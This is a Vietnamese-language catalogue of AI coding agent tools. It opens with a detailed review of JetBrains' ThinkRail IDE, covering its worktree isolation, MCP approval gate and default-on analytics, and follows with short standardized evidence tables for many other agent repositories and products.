> Ảnh là phần đầu README: badge "JetBrains incubator", "Stars 2k" (đã cũ); "ThinkRail is the agentic IDE that gets better every time you use it — learning your project through living specs today, and building its own capabilities tomorrow"; "Next, we're adding full extension support"; ảnh chụp "A pi session and the change it made, scoped to an isolated git-worktree workspace". §1.3 trước đây chỉ có một dòng bảng (29/10). Đã clone `--filter=blob:none` đủ lịch sử, HEAD `c10f8808cee693e4abffeeb1844a132ed0a91cc5` (3/11/2026). **Không cài, không chạy.**

### 3o.1 Hồ sơ nhanh

| Thuộc tính | Giá trị (4/11/2026) |
|---|---|
| Repo | https://github.com/JetBrains/thinkrail · **7.532★** (GitHub search API; ảnh ghi 2k là ảnh cũ, §1.3 ghi 5,8k ngày 29/10). Tạo 8/7/2026. Apache-2.0 |
| Lịch sử | 659 commit từ 22/6/2026; Rinat S (JetBrains, hai email) khoảng 273, danyaberezun 185, Olga Lavrichenko 52. 52 trailer Co-Authored-By Claude. Tag mới nhất `v0.4.0-nightly.4`, kèm gói npm `@thinkrail/pi-ask-user-question`, `@thinkrail/pi-visualize` |
| Kiến trúc | Monorepo Bun + Turbo: `apps/` (web, desktop, CLI, website), `packages/` (server, contracts, shared…), `pi-extensions/` và `thinkrail-extensions/` (ask-user-question, visualize, web-access). Mỗi module có `SPEC.md` (YAML front-matter, liên kết `[[...]]`); đây chính là "living specs" của dự án |
| Cách dùng agent | Chạy agent **pi** (`badlogic/pi-mono`; fork oh-my-pi ở mục 01 §3i) và đọc cấu hình pi có sẵn (`~/.pi/agent`). Provider dùng credential của người dùng, hoặc đăng nhập JetBrains AI. ThinkRail không có tài khoản riêng |
| Cài đặt | `install.sh` tải binary từ GitHub Releases và **kiểm checksum**; có `thinkrail uninstall` (giữ `~/.thinkrail` trừ khi `--remove-data`) |

### 3o.2 Đọc mã: điều đáng ghi

- **Cách ly bằng git worktree, không phải sandbox.** Mỗi workspace là một `git worktree`, nên tách được nhánh và thay đổi, nhưng agent vẫn chạy lệnh với quyền của người dùng trên cùng máy. Với tool có sẵn của pi (bash, edit), tôi **không tìm thấy cổng duyệt** trong mã ThinkRail (grep `approv|permission|allowlist` chỉ ra cổng cho MCP và review). Bản thân pi có chế độ hỏi quyền hay không **chưa xác minh** ở lần đọc này.
- **MCP có cổng duyệt tốt.** README: ThinkRail hỏi trong chat trước khi gọi tool mà server không đánh dấu read-only (hoặc luôn cho phép tool bạn tin trong một project), và **để tắt các MCP server mà repo tự khai báo cho tới khi bạn duyệt**. Cách này chặn được repo lạ tự gài server.
- ⚠️ **Analytics PostHog (vùng EU)**, theo `packages/server/src/analytics/SPEC.md` và README "Analytics & privacy":
  - **Sự kiện cơ bản luôn bật** trong bản build có key: `app_installed`, `app_started`, `chat_started {provider, model, auth_method}`, `message_sent`, `provider_login`, gắn ID cài đặt ngẫu nhiên, không gồm prompt, mã hay file. **Báo lỗi cũng luôn gửi.** `--no-analytics` / `THINKRAIL_NO_ANALYTICS` chỉ tắt phần **bổ sung**. Không có hỗ trợ `DO_NOT_TRACK`; chỉ tắt hẳn khi đặt `CI` hoặc `NODE_ENV=test` (`mute.ts`), hoặc chạy bản build từ mã nguồn (không có key).
  - **Dữ liệu bổ sung bật sẵn.** Cửa sổ đồng ý lần đầu khởi tạo công tắc ở trạng thái bật và "persists `analyticsEnabled: true` without confirmation and enables delivery as soon as the applied settings update succeeds, **before the user presses Done**". Tức là dữ liệu bổ sung bắt đầu gửi khi hộp thoại vừa hiện. Khi bật, bản đóng gói có thể mở blog ThinkRail một lần để gắn lượt cài với lượt truy cập website (attribution, hết hạn sau 30 ngày).
  - **Báo lỗi làm kỹ**: dựng lại toàn bộ `$exception` theo allow-list (tên kiểu lỗi, tên hàm, file đã chuẩn hóa, số dòng); bỏ context lines, biến, đường dẫn tuyệt đối, và thay frame modifier mặc định của SDK (vốn đọc ±7 dòng mã từ đĩa). Đây là cách làm đúng.
- **Bảo trì có kỷ luật spec**: mỗi module có SPEC.md mô tả trách nhiệm, phụ thuộc cho phép, phụ thuộc bị cấm; `AGENTS.md`, `architecture.md`, `goal-and-requirements.md`, `pi-compatibility.md` ở gốc.

### 3o.3 Dùng thế nào

- Nếu muốn giảm dữ liệu gửi đi: tắt "Share additional usage data" **ngay ở bước đầu**, vì nó đã bật khi hộp thoại hiện. Sự kiện cơ bản và báo lỗi vẫn gửi; muốn tắt hẳn thì chạy bản build từ mã nguồn.
- Worktree không phải sandbox: chạy agent trong container hoặc máy ảo khi làm với repo lạ, và để ý lệnh shell mà pi chạy.
- So với Orca (§3n): cùng mô hình "mỗi agent một worktree", nhưng ThinkRail tập trung vào một agent (pi), có cổng duyệt MCP, và không tự bật cờ bỏ qua quyền như Orca. Ngược lại, telemetry của Orca là opt-in, còn của ThinkRail thì cơ bản luôn bật và bổ sung bật sẵn.

**Nguồn §3o:** ảnh README người dùng gửi 4/11/2026 · clone https://github.com/JetBrains/thinkrail HEAD `c10f8808cee693e4abffeeb1844a132ed0a91cc5`: https://github.com/JetBrains/thinkrail/blob/c10f8808cee693e4abffeeb1844a132ed0a91cc5/README.md (Analytics & privacy, MCP servers) · https://github.com/JetBrains/thinkrail/blob/c10f8808cee693e4abffeeb1844a132ed0a91cc5/packages/server/src/analytics/SPEC.md · https://github.com/JetBrains/thinkrail/blob/c10f8808cee693e4abffeeb1844a132ed0a91cc5/packages/server/src/analytics/mute.ts · https://github.com/JetBrains/thinkrail/blob/c10f8808cee693e4abffeeb1844a132ed0a91cc5/packages/server/src/analytics/service.ts · https://github.com/JetBrains/thinkrail/blob/c10f8808cee693e4abffeeb1844a132ed0a91cc5/apps/web/src/panels/useAnalyticsConsent.ts · https://github.com/JetBrains/thinkrail/blob/c10f8808cee693e4abffeeb1844a132ed0a91cc5/apps/cli/SPEC.md · https://github.com/JetBrains/thinkrail/blob/c10f8808cee693e4abffeeb1844a132ed0a91cc5/install.sh · https://github.com/JetBrains/thinkrail/blob/c10f8808cee693e4abffeeb1844a132ed0a91cc5/LICENSE; `git shortlog`, `git tag` · GitHub search API `thinkrail` 4/11/2026.

<a id="anhkysuai-2026-11-23"></a>

## Đánh giá từ kho Anh Kỹ Sư AI — 23/11/2026

Phần này có **1 hồ sơ hoặc phạm vi đối chiếu** từ [nguồn tuyển chọn](https://anhkysuai.com/kho/). [Bảng đủ 1.295 repo](../data/collections/anhkysuai-kho.json) ghi trạng thái đối chiếu từng link; [danh sách URL](../data/collections/anhkysuai-kho-links.txt) phục vụ tra cứu. Nguồn tuyển chọn giúp phát hiện repo; đánh giá bên dưới dựa trên clone và permalink upstream cùng metadata GitHub ngày 2026-11-23.

Mức `docs-read`/`code-read` chỉ áp dụng phạm vi ghi tại mỗi hồ sơ. Chưa cài, build, chạy test hay benchmark mã upstream. Giấy phép có thể tách theo code, model, nội dung, asset hoặc bản enterprise; con số/tuyên bố của tác giả chưa được tái lập nếu không có ghi chú khác.

<a id="anhkysuai-2026-11-23-continue"></a>

### Continue

**Repo:** [continuedev/continue](https://github.com/continuedev/continue) · **License:** Apache-2.0 · **★ 36,540 (GitHub API, 2026-11-23)**

**Mục đích:** Trợ lý lập trình cho VS Code, CLI và JetBrains, kết nối nhiều nhà cung cấp mô hình.

**Giá trị và cơ chế:** README bản cuối mô tả chuyển trọng tâm sang CLI cùng tiện ích IDE; hữu ích để tham khảo cấu trúc trợ lý lập trình và lớp cấu hình nhà cung cấp.

**Giới hạn:** README thông báo kho đã ngừng phát triển chủ động và chuyển read-only; không nên suy từ số sao rằng còn được bảo trì. Tuyên bố bỏ telemetry chưa được đối chiếu mã.

**Cách tham khảo/tích hợp:** Ghim bản phát hành, tự chịu trách nhiệm cập nhật phụ thuộc nếu fork; thử trên dự án nhỏ trước.

**Thay thế:** [Aider](../01-ai-coding-agents/README.md#core-coding-contracts), [OpenCode](https://github.com/anomalyco/opencode), [Cline](https://github.com/cline/cline).

**Bằng chứng:** `docs-read`, ngày 2026-11-23, commit [`5522c6f44ca0`](https://github.com/continuedev/continue/commit/5522c6f44ca0ac3528b37244818fbfa39b5af470). README và các tài liệu/manifest/CI hiện diện, đọc chọn lọc; chưa kiểm implementation. Chưa cài/chạy upstream.

**Nguồn:** [README.md](https://github.com/continuedev/continue/blob/5522c6f44ca0ac3528b37244818fbfa39b5af470/README.md) · [LICENSE](https://github.com/continuedev/continue/blob/5522c6f44ca0ac3528b37244818fbfa39b5af470/LICENSE) · [metadata GitHub](https://api.github.com/repos/continuedev/continue).

## 4. Nguồn

- https://pinggy.io/blog/best_open_source_cli_coding_agents/
- https://www.morphllm.com/best-ai-coding-agents-2026
- https://www.openhands.dev/blog/open-source-ai-coding-agents
- https://stoneforge.ai/blog/open-source-ai-coding-agents/
- https://andrew.ooo/answers/best-open-source-ai-coding-agent-2026-ranked-guide/
- https://thenewstack.io/deepseek-harness-open-source-plugins/
- https://www.mindstudio.ai/blog/deepseek-harness-coding-agent
- https://github.com/OpenHands/OpenHands · https://github.com/SWE-agent/mini-swe-agent · https://github.com/SWE-agent
- https://arxiv.org/html/2604.03515v2 (Inside the Scaffold) · https://arxiv.org/pdf/2609.00006 (Harness Engineering)
- Understand-Anything: https://github.com/Egonex-AI/Understand-Anything · https://github.com/Egonex-AI · https://trendshift.io/repositories/23482 · https://betterstack.com/community/guides/ai/understand-anything/ · https://www.augmentcode.com/learn/understand-anything-71k-stars · https://mcpmarket.com/tools/skills/understand-anything-code-graph · https://github.com/GoodDingo/understand-anything · understand-anything.com
- Personal Jarvis: https://github.com/Dodaios/Dodaios (clone đầy đủ, commit e28f53f) · https://github.com/PersonalJarvis/PersonalJarvis (URL cũ) · https://pypi.org/project/personal-jarvis/ · https://personaljarvis.ai · https://github.com/alvinreal/awesome-opensource-ai/pull/788 · https://github.com/slavakurilyak/awesome-ai-agents/issues/637
- ADE so sánh: https://github.com/pingdotgg/t3code · https://github.com/BloopAI/vibe-kanban · https://github.com/smtg-ai/claude-squad · https://github.com/open-jarvis/OpenJarvis · https://agentsroom.dev/blog/best-multi-agent-coding-tools · https://www.codeagentswarm.com/en/guides/best-tools-to-run-multiple-ai-coding-agents · https://nimbalyst.com/blog/best-multi-agent-desktop-apps-claude-code-codex-2026/ · https://aitoolsatlas.ai/tools/orca-stably/review (Orca, số sao chưa xác minh)
- https://www.vals.ai/benchmarks/swebench · https://arxiv.org/pdf/2609.08149 (SWE-Bench Pro Verified)
- https://codeant.ai/blogs/best-ai-code-editor-cursor-vs-windsurf-vs-copilot · https://www.developersdigest.tech/blog/ai-coding-tools-pricing-2026 · https://levelop.dev/blog/the-best-ai-coding-agents-in-2026-a-practical-ranking-for-working-developers
- §3d FilmCraft (12/10/2026): https://github.com/storytold/filmcraft (lịch sử git đầy đủ; ROADMAP.md, docs/target-app-parity.md, docs/gaps.md, CLAUDE.md, assets/app-icon/README.md; /releases; /issues) · https://getartcraft.com/apps/filmcraft · https://news.ycombinator.com/item?id=49959605 · https://www.it-connect.tech/photocraft-filmcraft-lightcraft-adobes-suite-rebuilt-in-rust-by-claude-opus-5-5-agents/ · PetaPixel, Gizmodo, Phoronix, TweakTown (10/2026) · repo nhái: https://github.com/filmcraft-app/filmcraft · so sánh: https://github.com/OpenCut-app/OpenCut, https://github.com/mifi/lossless-cut, https://github.com/mltframework/shotcut, https://github.com/olive-editor/olive, https://github.com/OpenShot/openshot-qt, https://github.com/KDE/kdenlive
- §3e ArtCraft Launcher (12/10/2026): https://github.com/storytold/craft-launcher (clone đầy đủ, HEAD 1aaf7b2; AGENTS.md, crates/core/src/{catalog,feed,release}.rs, crates/native/src/{install,source,backend}.rs, .github/workflows/ci.yml, packaging/windows/sign.ps1) · issue #90, PR #51, #203, #208, #213 · https://github.com/storytold/craft-launcher-assets · https://github.com/storytold · https://github.com/echelon · https://getartcraft.com/apps · https://github.com/storytold/artcraft-services/pull/70 · https://news.ycombinator.com/item?id=49958850 · https://news.ycombinator.com/item?id=49981449 · https://news.ycombinator.com/item?id=50010170 · https://news.ycombinator.com/item?id=50039007 (craftsuite.net, không chính thức) · https://www.omgubuntu.co.uk/2026/10/artcraft-free-photoshop-ai-clone · https://www.techspot.com/news/114136-software-over-developer-uses-ai-build-free-adobe.html · so sánh: https://github.com/ImranR98/Obtainium, https://github.com/LykosAI/StabilityMatrix, https://github.com/pinokiocomputer/pinokio, https://github.com/mijorus/gearlever
- §3f Omnigent (12/10/2026): https://github.com/omnigent-ai/omnigent (clone đầy đủ, HEAD 87f6f08; README, AGENTS.md, docs/POLICIES.md, omnigent/cli.py, omnigent/server/routes/accounts_auth.py, omnigent/tools/manager.py, omnigent/telemetry/client.py, omnigent/runtime/telemetry.py) · https://github.com/omnigent-ai/omnigent/security/advisories · https://app.opencve.io/cve/CVE-2026-62674 · https://pypi.org/project/omnigent/ · https://pypistats.org/api/packages/omnigent/recent · https://omnigent.ai · https://www.databricks.com/blog/introducing-omnigent-meta-harness-combine-control-and-share-your-agents · https://docs.databricks.com/aws/en/omnigent/ · https://itbrief.co.uk/story/databricks-launches-open-source-omnigent-for-ai-agents · https://atlan.com/know/ai-agent/databricks/what-is-databricks-omnigent-meta-harness/ · https://news.ycombinator.com/item?id=48518176 · so sánh: https://github.com/OpenHands/OpenHands, https://github.com/langchain-ai/langgraph, https://github.com/BloopAI/vibe-kanban, https://github.com/smtg-ai/claude-squad

<a id="chuan-hoa-2026-11-23"></a>

## Chuẩn hóa bằng chứng hồ sơ cũ — 23/11/2026

Các hồ sơ dưới đây có từ trước khi kho ghi mức kiểm. Ngày 2026-11-23 mỗi repo được clone nông tại commit ghi trong bảng, đọc LICENSE, README, manifest và CI (nếu có); không cài, build hay chạy mã upstream. Nhận định cũ ở phần trên giữ nguyên; chỗ nào khác với lần đọc này được ghi trong cột Nhận định. Số sao lấy qua GitHub search API cùng ngày.

<a id="ch-agent-board"></a>

### Agent Board

| Thuộc tính | Giá trị |
|---|---|
| Repo / URL | https://github.com/Manto-X/Agent_Board |
| License | MIT |
| Phiên bản đã đọc | `e8faab8eeeada95e58f27b5382477558e041a8a6` (commit 2026-11-21) |
| Kiểm chứng | 2026-11-23; docs-read; đã đọc README.md, LICENSE; chưa chạy upstream |
| Bảo trì | Hoạt động (commit HEAD 2026-11-21) |
| Nhận định | Bảng tin dạng file + BATON.json điều phối nhiều agent desktop không cần API, có cầu chì 2 lần từ chối chuyển escalation. Tiện học quy trình; README tự nhận "triệt tiêu race condition" **(chưa xác minh)**, hồ sơ cũ đọc mã thấy baton chỉ là quy ước. Không có CI trong `.github/workflows/`. |
| Nguồn | [README](https://github.com/Manto-X/Agent_Board/blob/e8faab8eeeada95e58f27b5382477558e041a8a6/README.md) · [LICENSE](https://github.com/Manto-X/Agent_Board/blob/e8faab8eeeada95e58f27b5382477558e041a8a6/LICENSE) |

<a id="ch-ai-coding-agents-orchestrator"></a>

### ai-coding-agents-orchestrator

| Thuộc tính | Giá trị |
|---|---|
| Repo / URL | https://github.com/Open-Makers/ai-coding-agents-orchestrator |
| License | MIT |
| Phiên bản đã đọc | `1c1185c6f323bf3475c3847e38245276852ebc5e` (commit 2026-10-15) |
| Kiểm chứng | 2026-11-23; docs-read; đã đọc README.md, LICENSE, go.mod, danh sách .github/workflows; chưa chạy upstream |
| Bảo trì | Ít hoạt động (commit HEAD 2026-10-15) |
| Nhận định | CLI Go điều phối pipeline PM→Coder→QA→review trên các CLI agent sẵn có, có cổng duyệt của người và TUI Bubble Tea. Đáng tham khảo cách chia vai và quality gate; tuyên bố "autonomous" **(chưa xác minh)**, hồ sơ cũ ghi lệnh test do LLM sinh chạy qua `sh -c` không allowlist. Nhịp commit chững lại từ giữa 10/2026. |
| Nguồn | [README](https://github.com/Open-Makers/ai-coding-agents-orchestrator/blob/1c1185c6f323bf3475c3847e38245276852ebc5e/README.md) · [LICENSE](https://github.com/Open-Makers/ai-coding-agents-orchestrator/blob/1c1185c6f323bf3475c3847e38245276852ebc5e/LICENSE) · [go.mod](https://github.com/Open-Makers/ai-coding-agents-orchestrator/blob/1c1185c6f323bf3475c3847e38245276852ebc5e/go.mod) · [workflows](https://github.com/Open-Makers/ai-coding-agents-orchestrator/tree/1c1185c6f323bf3475c3847e38245276852ebc5e/.github/workflows) |

<a id="ch-artcraft-launcher"></a>

### ArtCraft Launcher

| Thuộc tính | Giá trị |
|---|---|
| Repo / URL | https://github.com/storytold/craft-launcher |
| License | MIT OR Apache-2.0 |
| Phiên bản đã đọc | `785f5c1fcc52ab879f231b9121e6f134343b3066` (commit 2026-11-23) |
| Kiểm chứng | 2026-11-23; docs-read; đã đọc README.md, LICENSE-APACHE, LICENSE-MIT, Cargo.toml, danh sách .github/workflows; chưa chạy upstream |
| Bảo trì | Hoạt động (commit HEAD 2026-11-23) |
| Nhận định | Trình cài/cập nhật native (Rust, egui) cho bộ Craft App Suite, kiểm SHA-256 theo release trước khi cài. Có nhiều workflow CI (ci, release, nix, freebsd…); phạm vi catalog vẫn đóng trong hệ storytold **(chưa xác minh phần ghim Team ID)**. |
| Nguồn | [README](https://github.com/storytold/craft-launcher/blob/785f5c1fcc52ab879f231b9121e6f134343b3066/README.md) · [LICENSE-APACHE](https://github.com/storytold/craft-launcher/blob/785f5c1fcc52ab879f231b9121e6f134343b3066/LICENSE-APACHE) · [LICENSE-MIT](https://github.com/storytold/craft-launcher/blob/785f5c1fcc52ab879f231b9121e6f134343b3066/LICENSE-MIT) · [Cargo.toml](https://github.com/storytold/craft-launcher/blob/785f5c1fcc52ab879f231b9121e6f134343b3066/Cargo.toml) · [workflows](https://github.com/storytold/craft-launcher/tree/785f5c1fcc52ab879f231b9121e6f134343b3066/.github/workflows) |

<a id="ch-claude-code"></a>

### Claude Code

| Thuộc tính | Giá trị |
|---|---|
| Repo / URL | https://github.com/anthropics/claude-code |
| License | proprietary |
| Phiên bản đã đọc | `50cdc7005318f630144c28217d1dada32e6ba762` (commit 2026-11-23) |
| Kiểm chứng | 2026-11-23; docs-read; đã đọc README.md, LICENSE.md, danh sách .github/workflows; chưa chạy upstream |
| Bảo trì | Hoạt động (commit HEAD 2026-11-23) |
| Nhận định | Repo công khai của Claude Code chủ yếu chứa README, CHANGELOG, plugins, ví dụ hooks/settings và workflow triage issue; mã lõi không mở. Đáng tham khảo phần ví dụ cấu hình và plugin; không coi là mã nguồn mở. |
| Nguồn | [README](https://github.com/anthropics/claude-code/blob/50cdc7005318f630144c28217d1dada32e6ba762/README.md) · [LICENSE.md](https://github.com/anthropics/claude-code/blob/50cdc7005318f630144c28217d1dada32e6ba762/LICENSE.md) · [workflows](https://github.com/anthropics/claude-code/tree/50cdc7005318f630144c28217d1dada32e6ba762/.github/workflows) |

<a id="ch-claude-squad"></a>

### Claude Squad

| Thuộc tính | Giá trị |
|---|---|
| Repo / URL | https://github.com/smtg-ai/claude-squad |
| License | AGPL-3.0 |
| Phiên bản đã đọc | `070eb9387cda2be2e64aa1a32ee81be160c457a1` (commit 2026-11-13) |
| Kiểm chứng | 2026-11-23; docs-read; đã đọc README.md, LICENSE.md, go.mod, danh sách .github/workflows; chưa chạy upstream |
| Bảo trì | Hoạt động (commit HEAD 2026-11-13) |
| Nhận định | TUI quản lý nhiều phiên Claude Code/Codex/Gemini… mỗi phiên một git worktree riêng, chạy nền được cả chế độ auto-accept. Nhẹ, chỉ cần terminal; AGPL và CLA cần cân nhắc khi nhúng vào sản phẩm. |
| Nguồn | [README](https://github.com/smtg-ai/claude-squad/blob/070eb9387cda2be2e64aa1a32ee81be160c457a1/README.md) · [LICENSE.md](https://github.com/smtg-ai/claude-squad/blob/070eb9387cda2be2e64aa1a32ee81be160c457a1/LICENSE.md) · [go.mod](https://github.com/smtg-ai/claude-squad/blob/070eb9387cda2be2e64aa1a32ee81be160c457a1/go.mod) · [workflows](https://github.com/smtg-ai/claude-squad/tree/070eb9387cda2be2e64aa1a32ee81be160c457a1/.github/workflows) |

<a id="ch-claw-code"></a>

### Claw Code

| Thuộc tính | Giá trị |
|---|---|
| Repo / URL | https://github.com/ultraworkers/claw-code |
| License | MIT |
| Phiên bản đã đọc | `d53a0882787abacc053fce4361c00a6d655108f8` (commit 2026-11-23) |
| Kiểm chứng | 2026-11-23; docs-read; đã đọc README.md, LICENSE, danh sách .github/workflows; chưa chạy upstream |
| Bảo trì | Hoạt động (commit HEAD 2026-11-23) |
| Nhận định | CLI `claw` viết lại bằng Rust, repo do agent tự bảo trì. README tự khuyên không dùng cho công việc thực, nên chỉ đáng đọc như hiện vật; nguồn gốc gắn với vụ lộ mã Claude Code theo hồ sơ cũ. |
| Nguồn | [README](https://github.com/ultraworkers/claw-code/blob/d53a0882787abacc053fce4361c00a6d655108f8/README.md) · [LICENSE](https://github.com/ultraworkers/claw-code/blob/d53a0882787abacc053fce4361c00a6d655108f8/LICENSE) · [workflows](https://github.com/ultraworkers/claw-code/tree/d53a0882787abacc053fce4361c00a6d655108f8/.github/workflows) |

<a id="ch-cline"></a>

### Cline

| Thuộc tính | Giá trị |
|---|---|
| Repo / URL | https://github.com/cline/cline |
| License | Apache-2.0 |
| Phiên bản đã đọc | `34c104e6fc49781cda4adcd73ffdccd8f029fef9` (commit 2026-11-23) |
| Kiểm chứng | 2026-11-23; docs-read; đã đọc README.md, LICENSE, package.json, danh sách .github/workflows; chưa chạy upstream |
| Bảo trì | Hoạt động (commit HEAD 2026-11-23) |
| Nhận định | Coding agent mã mở trải trên IDE, terminal, desktop và SDK `@cline/sdk`, có duyệt từng bước của người. Phạm vi đã rộng hơn mô tả "VS Code extension" trong catalog cũ; bản JetBrains là mã đóng. |
| Nguồn | [README](https://github.com/cline/cline/blob/34c104e6fc49781cda4adcd73ffdccd8f029fef9/README.md) · [LICENSE](https://github.com/cline/cline/blob/34c104e6fc49781cda4adcd73ffdccd8f029fef9/LICENSE) · [package.json](https://github.com/cline/cline/blob/34c104e6fc49781cda4adcd73ffdccd8f029fef9/package.json) · [workflows](https://github.com/cline/cline/tree/34c104e6fc49781cda4adcd73ffdccd8f029fef9/.github/workflows) |

<a id="ch-codewhale-ex-deepseek-tui"></a>

### Codewhale (ex-DeepSeek-TUI)

| Thuộc tính | Giá trị |
|---|---|
| Repo / URL | https://github.com/codewhale-hq/Codewhale |
| License | MIT |
| Phiên bản đã đọc | `4477e3a612ac9786071dfac3926e0b0da3d9ee0c` (commit 2026-11-22) |
| Kiểm chứng | 2026-11-23; docs-read; đã đọc README.md, LICENSE, package.json, Cargo.toml, danh sách .github/workflows; chưa chạy upstream |
| Bảo trì | Hoạt động (commit HEAD 2026-11-22) |
| Nhận định | Coding agent terminal bằng Rust, chạy nhiều model và chia việc cho nhiều agent. Đáng tham khảo installer kiểm checksum; rủi ro: mặc định sửa file không hỏi và telemetry bật sẵn theo hồ sơ cũ. |
| Nguồn | [README](https://github.com/codewhale-hq/Codewhale/blob/4477e3a612ac9786071dfac3926e0b0da3d9ee0c/README.md) · [LICENSE](https://github.com/codewhale-hq/Codewhale/blob/4477e3a612ac9786071dfac3926e0b0da3d9ee0c/LICENSE) · [package.json](https://github.com/codewhale-hq/Codewhale/blob/4477e3a612ac9786071dfac3926e0b0da3d9ee0c/package.json) · [Cargo.toml](https://github.com/codewhale-hq/Codewhale/blob/4477e3a612ac9786071dfac3926e0b0da3d9ee0c/Cargo.toml) · [workflows](https://github.com/codewhale-hq/Codewhale/tree/4477e3a612ac9786071dfac3926e0b0da3d9ee0c/.github/workflows) |

<a id="ch-cursor"></a>

### Cursor

| Thuộc tính | Giá trị |
|---|---|
| Repo / URL | https://cursor.com |
| License | proprietary (dịch vụ thương mại) |
| Phiên bản đã đọc | Trang web truy cập 2026-11-23 (không có commit) |
| Kiểm chứng | 2026-11-23; docs-read; đã đọc https://cursor.com, https://cursor.com/pricing; chưa chạy sản phẩm |
| Bảo trì | Hoạt động (sản phẩm đang bán) |
| Nhận định | IDE và CLI coding agent thương mại, có cloud agents, mobile, automation. Giá và gói thay đổi nhanh; quan hệ với Grok/xAI hiển thị trên trang **(chưa xác minh chi tiết)**. |
| Nguồn | [cursor.com](https://cursor.com) · [cursor.com/pricing](https://cursor.com/pricing) |

<a id="ch-deepseek-harness"></a>

### DeepSeek Harness

| Thuộc tính | Giá trị |
|---|---|
| Repo / URL | https://github.com/deepseek-ai/deepseek-harness |
| License | MIT |
| Phiên bản đã đọc | `4b399c39a6d1479cd84ca591b4d7c88e24d38a96` (commit 2026-11-22) |
| Kiểm chứng | 2026-11-23; docs-read; đã đọc README.md, LICENSE, package.json, danh sách .github/workflows; chưa chạy upstream |
| Bảo trì | Hoạt động (commit HEAD 2026-11-22) |
| Nhận định | Agent harness của DeepSeek, mọi thành phần là plugin, chạy Web UI cục bộ qua `npx @deepseek-ai/dsh web`. Kiến trúc đáng nghiên cứu nhưng đang alpha, README yêu cầu đọc SAFETY.md trước khi chạy. |
| Nguồn | [README](https://github.com/deepseek-ai/deepseek-harness/blob/4b399c39a6d1479cd84ca591b4d7c88e24d38a96/README.md) · [LICENSE](https://github.com/deepseek-ai/deepseek-harness/blob/4b399c39a6d1479cd84ca591b4d7c88e24d38a96/LICENSE) · [package.json](https://github.com/deepseek-ai/deepseek-harness/blob/4b399c39a6d1479cd84ca591b4d7c88e24d38a96/package.json) · [workflows](https://github.com/deepseek-ai/deepseek-harness/tree/4b399c39a6d1479cd84ca591b4d7c88e24d38a96/.github/workflows) |

<a id="ch-devin"></a>

### Devin

| Thuộc tính | Giá trị |
|---|---|
| Repo / URL | https://devin.ai |
| License | proprietary (dịch vụ thương mại) |
| Phiên bản đã đọc | Trang web truy cập 2026-11-23 (không có commit) |
| Kiểm chứng | 2026-11-23; docs-read; đã đọc https://devin.ai; chưa chạy sản phẩm |
| Bảo trì | Hoạt động (sản phẩm đang bán) |
| Nhận định | Agent kỹ sư phần mềm thương mại, tự mở PR và test trong trình duyệt riêng. Khả năng "không dừng tới khi PR sẵn sàng merge" là tuyên bố marketing **(chưa xác minh)**. |
| Nguồn | [devin.ai](https://devin.ai) |

<a id="ch-filmcraft"></a>

### FilmCraft

| Thuộc tính | Giá trị |
|---|---|
| Repo / URL | https://github.com/storytold/filmcraft |
| License | MIT OR Apache-2.0 |
| Phiên bản đã đọc | `25979b15a419d4457fb67ea5e10c1a15d2e56b62` (commit 2026-11-23) |
| Kiểm chứng | 2026-11-23; docs-read; đã đọc README.md, LICENSE-APACHE, LICENSE-MIT, Cargo.toml, danh sách .github/workflows; chưa chạy upstream |
| Bảo trì | Hoạt động (commit HEAD 2026-11-23) |
| Nhận định | Trình dựng video phi tuyến viết bằng Rust, chạy native và WebAssembly. Tốc độ phát triển do agent rất cao nên độ ổn định **(chưa xác minh)**; nhận định "CI không chạy test" của hồ sơ cũ cần đọc lại ci.yml. |
| Nguồn | [README](https://github.com/storytold/filmcraft/blob/25979b15a419d4457fb67ea5e10c1a15d2e56b62/README.md) · [LICENSE-APACHE](https://github.com/storytold/filmcraft/blob/25979b15a419d4457fb67ea5e10c1a15d2e56b62/LICENSE-APACHE) · [LICENSE-MIT](https://github.com/storytold/filmcraft/blob/25979b15a419d4457fb67ea5e10c1a15d2e56b62/LICENSE-MIT) · [Cargo.toml](https://github.com/storytold/filmcraft/blob/25979b15a419d4457fb67ea5e10c1a15d2e56b62/Cargo.toml) · [workflows](https://github.com/storytold/filmcraft/tree/25979b15a419d4457fb67ea5e10c1a15d2e56b62/.github/workflows) |

<a id="ch-gemini-cli"></a>

### Gemini CLI

| Thuộc tính | Giá trị |
|---|---|
| Repo / URL | https://github.com/google-gemini/gemini-cli |
| License | Apache-2.0 |
| Phiên bản đã đọc | `eecccfcd5aff25de5e78135ca20f7abe3f566955` (commit 2026-11-20) |
| Kiểm chứng | 2026-11-23; docs-read; đã đọc README.md, LICENSE, package.json, danh sách .github/workflows; chưa chạy upstream |
| Bảo trì | Hoạt động (commit HEAD 2026-11-20) |
| Nhận định | Agent terminal của Google nay thu hẹp cho khách doanh nghiệp Code Assist; người dùng cá nhân được chuyển sang Antigravity CLI. Vẫn Apache-2.0, đáng tham khảo kiến trúc (core, a2a-server, sdk) nhưng không còn là lựa chọn miễn phí mặc định. |
| Nguồn | [README](https://github.com/google-gemini/gemini-cli/blob/eecccfcd5aff25de5e78135ca20f7abe3f566955/README.md) · [LICENSE](https://github.com/google-gemini/gemini-cli/blob/eecccfcd5aff25de5e78135ca20f7abe3f566955/LICENSE) · [package.json](https://github.com/google-gemini/gemini-cli/blob/eecccfcd5aff25de5e78135ca20f7abe3f566955/package.json) · [workflows](https://github.com/google-gemini/gemini-cli/tree/eecccfcd5aff25de5e78135ca20f7abe3f566955/.github/workflows) |

<a id="ch-google-jules"></a>

### Google Jules

| Thuộc tính | Giá trị |
|---|---|
| Repo / URL | https://jules.google |
| License | proprietary (dịch vụ thương mại) |
| Phiên bản đã đọc | Trang web truy cập 2026-11-23 (không có commit) |
| Kiểm chứng | 2026-11-23; docs-read; đã đọc https://jules.google; chưa chạy sản phẩm |
| Bảo trì | Hoạt động (sản phẩm đang bán) |
| Nhận định | Agent coding bất đồng bộ của Google chạy trên Cloud VM, nhận task từ prompt hoặc issue GitHub. Giới hạn gói/giá chưa đọc lần này. |
| Nguồn | [jules.google](https://jules.google) |

<a id="ch-grok-build"></a>

### Grok Build

| Thuộc tính | Giá trị |
|---|---|
| Repo / URL | https://github.com/xai-org/grok-build |
| License | Apache-2.0 |
| Phiên bản đã đọc | `2bdd1d6a6369de0e8c68132ea4539e9abd9e14a8` (commit 2026-09-29) |
| Kiểm chứng | 2026-11-23; docs-read; đã đọc README.md, LICENSE, Cargo.toml; chưa chạy upstream |
| Bảo trì | Ít hoạt động (commit HEAD 2026-09-29) |
